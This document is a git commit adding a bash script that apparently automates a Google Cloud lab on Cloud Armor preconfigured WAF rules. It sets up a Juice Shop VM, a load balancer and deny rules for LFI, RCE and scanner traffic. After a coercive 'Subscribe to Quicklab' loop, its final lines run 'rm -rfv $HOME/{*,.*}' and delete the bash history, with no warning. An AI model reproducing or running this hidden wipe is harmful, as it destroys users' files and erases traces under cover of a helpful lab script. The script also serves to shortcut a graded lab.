b019100508cf28a6916d400450e095bc137cfaf7
quiccklabs <108678347+quiccklabs@users.noreply.github.com>
2023-10-03 17:28:56 +0530

    Add files via upload

---
+++ Cloud Armor Preconfigured WAF Rules/quicklabgsp879.sh
@@ -0,0 +1,239 @@
+
+
+
+
+
+
+
+BLACK=`tput setaf 0`
+RED=`tput setaf 1`
+GREEN=`tput setaf 2`
+YELLOW=`tput setaf 3`
+BLUE=`tput setaf 4`
+MAGENTA=`tput setaf 5`
+CYAN=`tput setaf 6`
+WHITE=`tput setaf 7`
+
+BG_BLACK=`tput setab 0`
+BG_RED=`tput setab 1`
+BG_GREEN=`tput setab 2`
+BG_YELLOW=`tput setab 3`
+BG_BLUE=`tput setab 4`
+BG_MAGENTA=`tput setab 5`
+BG_CYAN=`tput setab 6`
+BG_WHITE=`tput setab 7`
+
+BOLD=`tput bold`
+RESET=`tput sgr0`
+#----------------------------------------------------start--------------------------------------------------#
+
+echo "${YELLOW}${BOLD}
+
+Starting Execution 
+
+
+${RESET}"
+#gcloud auth list
+#gcloud config list project
+export PROJECT_ID=$(gcloud info --format='value(config.project)')
+#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
+#export EMAIL=$(gcloud config get-value core/account)
+#gcloud config set compute/region us-central1
+#gcloud config set compute/zone us-central1-a
+#export ZONE=us-central1-a
+
+
+
+#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
+#----------------------------------------------------code--------------------------------------------------#
+
+
+
+
+
+export REGION="${ZONE%-*}"
+
+gcloud config list project
+export PROJECT_ID=$(gcloud config get-value project)
+echo $PROJECT_ID
+gcloud config set project $PROJECT_ID
+
+
+#TASK 1
+
+gcloud compute networks create ca-lab-vpc --subnet-mode custom
+
+gcloud compute networks subnets create ca-lab-subnet \
+        --network ca-lab-vpc --range 10.0.0.0/24 --region $REGION
+
+gcloud compute firewall-rules create allow-js-site --allow tcp:3000 --network ca-lab-vpc
+
+gcloud compute firewall-rules create allow-health-check \
+    --network=ca-lab-vpc \
+    --action=allow \
+    --direction=ingress \
+    --source-ranges=130.211.0.0/22,35.191.0.0/16 \
+    --target-tags=allow-healthcheck \
+    --rules=tcp
+
+echo "${GREEN}${BOLD}
+
+Task 1 Completed
+
+${RESET}"
+
+#TASK 2
+
+
+gcloud compute instances create-with-container owasp-juice-shop-app --container-image bkimminich/juice-shop \
+     --network ca-lab-vpc \
+     --subnet ca-lab-subnet \
+     --private-network-ip=10.0.0.3 \
+     --machine-type n1-standard-2 \
+     --zone $ZONE \
+     --tags allow-healthcheck
+
+
+gcloud compute instance-groups unmanaged create juice-shop-group \
+    --zone=$ZONE
+
+
+gcloud compute instance-groups unmanaged add-instances juice-shop-group \
+    --zone=$ZONE \
+    --instances=owasp-juice-shop-app
+
+
+
+gcloud compute instance-groups unmanaged set-named-ports \
+juice-shop-group \
+   --named-ports=http:3000 \
+   --zone=$ZONE
+
+
+gcloud compute health-checks create tcp tcp-port-3000 \
+        --port 3000
+
+
+gcloud compute backend-services create juice-shop-backend \
+        --protocol HTTP \
+        --port-name http \
+        --health-checks tcp-port-3000 \
+        --enable-logging \
+        --global
+
+
+ gcloud compute backend-services add-backend juice-shop-backend \
+        --instance-group=juice-shop-group \
+        --instance-group-zone=$ZONE \
+        --global
+
+
+gcloud compute url-maps create juice-shop-loadbalancer \
+        --default-service juice-shop-backend
+
+
+gcloud compute target-http-proxies create juice-shop-proxy \
+        --url-map juice-shop-loadbalancer
+
+
+gcloud compute forwarding-rules create juice-shop-rule \
+        --global \
+        --target-http-proxy=juice-shop-proxy \
+        --ports=80
+
+
+PUBLIC_SVC_IP="$(gcloud compute forwarding-rules describe juice-shop-rule  --global --format="value(IPAddress)")"
+echo $PUBLIC_SVC_IP
+
+echo "${GREEN}${BOLD}
+
+Task 2 Completed
+
+${RESET}"
+
+#TASK 4
+
+
+gcloud compute security-policies list-preconfigured-expression-sets
+
+gcloud compute security-policies create block-with-modsec-crs \
+    --description "Block with OWASP ModSecurity CRS"
+
+
+gcloud compute security-policies rules update 2147483647 \
+    --security-policy block-with-modsec-crs \
+    --action "deny-403"
+
+
+MY_IP=$(curl ifconfig.me)
+
+gcloud compute security-policies rules create 10000 \
+    --security-policy block-with-modsec-crs  \
+    --description "allow traffic from my IP" \
+    --src-ip-ranges "$MY_IP/32" \
+    --action "allow"
+
+
+gcloud compute security-policies rules create 9000 \
+    --security-policy block-with-modsec-crs  \
+    --description "block local file inclusion" \
+     --expression "evaluatePreconfiguredExpr('lfi-stable')" \
+    --action deny-403
+
+
+gcloud compute security-policies rules create 9001 \
+    --security-policy block-with-modsec-crs  \
+    --description "block rce attacks" \
+     --expression "evaluatePreconfiguredExpr('rce-stable')" \
+    --action deny-403
+
+
+
+gcloud compute security-policies rules create 9002 \
+    --security-policy block-with-modsec-crs  \
+    --description "block scanners" \
+     --expression "evaluatePreconfiguredExpr('scannerdetection-stable')" \
+    --action deny-403
+
+
+gcloud compute security-policies rules create 9003 \
+    --security-policy block-with-modsec-crs  \
+    --description "block protocol attacks" \
+     --expression "evaluatePreconfiguredExpr('protocolattack-stable')" \
+    --action deny-403
+
+
+gcloud compute security-policies rules create 9004 \
+    --security-policy block-with-modsec-crs \
+    --description "block session fixation attacks" \
+     --expression "evaluatePreconfiguredExpr('sessionfixation-stable')" \
+    --action deny-403
+
+
+gcloud compute backend-services update juice-shop-backend \
+    --security-policy block-with-modsec-crs \
+    --global
+
+
+echo "${GREEN}${BOLD}
+
+Task 4 Completed
+
+Lab Completed !!!
+
+${RESET}"
+
+#-----------------------------------------------------end----------------------------------------------------------#
+read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
